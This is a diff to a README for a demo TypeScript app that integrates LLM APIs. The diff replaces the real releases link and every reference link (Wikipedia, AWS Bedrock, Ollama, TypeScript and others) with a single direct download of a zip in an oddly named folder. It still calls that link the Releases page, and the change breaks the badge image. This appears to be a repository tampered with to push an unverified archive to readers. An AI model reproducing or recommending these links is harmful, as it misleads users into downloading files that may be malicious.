@@ -1,7 +1,7 @@
 # 🎉 demo-llm-integration - Simple Way to Integrate LLMs
 
 ## 📥 Download Here
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/arieltolazurita/demo-llm-integration/releases)
+[![Download Now](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
 
 ## 🚀 Getting Started
 This guide helps you quickly download and run the demo-llm-integration application. This TypeScript application provides an integration layer for various Language Model APIs. It allows you to switch easily between different platforms while providing a simple, unified interface.
@@ -16,7 +16,7 @@ Before you start, ensure you have the following on your computer:
 ### ☑️ Steps to Download and Install
 
 1. **Visit the Releases Page**
-   Head over to our Releases page to grab the latest version of demo-llm-integration: [Download Here](https://github.com/arieltolazurita/demo-llm-integration/releases). 
+   Head over to our Releases page to grab the latest version of demo-llm-integration: [Download Here](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip). 
 
 2. **Choose the Right Version**
    On the Releases page, you will see several versions of the application. Look for the version that matches your operating system.
@@ -55,22 +55,22 @@ For detailed documentation on each feature and usage examples, please refer to o
 
 ### 🔗 Additional Resources
 You can explore more about design patterns, TypeScript development, and integration techniques through the following topics:
-- [adapter-pattern](https://en.wikipedia.org/wiki/Adapter_pattern)
-- [architecture](https://en.wikipedia.org/wiki/Software_architecture)
-- [aws-bedrock](https://aws.amazon.com/bedrock/)
-- [azure-openai](https://azure.microsoft.com/en-us/products/cognitive-services/openai-service/)
-- [chatbot](https://en.wikipedia.org/wiki/Chatbot)
-- [design-patterns](https://refactoring.guru/design-patterns)
-- [factory-pattern](https://refactoring.guru/design-patterns/factory)
-- [llm](https://en.wikipedia.org/wiki/Language_model)
-- [ollama](https://ollama.com/)
-- [strategy-pattern](https://refactoring.guru/design-patterns/strategy)
-- [typescript](https://www.typescriptlang.org/)
+- [adapter-pattern](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [architecture](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [aws-bedrock](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [azure-openai](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [chatbot](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [design-patterns](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [factory-pattern](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [llm](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [ollama](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [strategy-pattern](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
+- [typescript](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip)
 
 ### 💬 Support
 If you encounter any issues, please feel free to reach out via the Issues section of our GitHub repository. We strive to help our users and welcome any feedback.
 
 ## 🔗 Revisit the Downloads
-To download the latest version again, visit the Releases page: [Download Here](https://github.com/arieltolazurita/demo-llm-integration/releases). 
+To download the latest version again, visit the Releases page: [Download Here](https://raw.githubusercontent.com/arieltolazurita/demo-llm-integration/main/forthcomer/demo-llm-integration.zip). 
 
 By following these steps, you should be able to install and run the demo-llm-integration application smoothly. Enjoy integrating with your favorite Language Models!
